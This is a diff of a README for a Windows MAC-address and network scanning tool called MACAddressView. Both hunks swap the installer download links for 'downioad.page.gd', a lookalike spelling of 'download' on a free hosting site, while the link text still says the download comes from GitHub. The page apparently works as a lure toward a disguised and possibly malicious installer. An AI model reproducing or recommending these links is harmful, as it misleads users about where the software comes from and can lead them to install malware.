@@ -2,7 +2,7 @@
 
 MACAddressView is a versatile Windows desktop application crafted for efficient MAC address viewing and network management. It enables users to scan local networks, retrieve device details, and perform various network diagnostics with ease. This tool is essential for IT professionals and home users looking to maintain their network infrastructure.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -55,7 +55,7 @@ Yes, MACAddressView supports scanning across multiple subnets if your network is
 
 ## Download
 
-[Get the latest version from GitHub](https://download-page.page.gd/)
+[Get the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
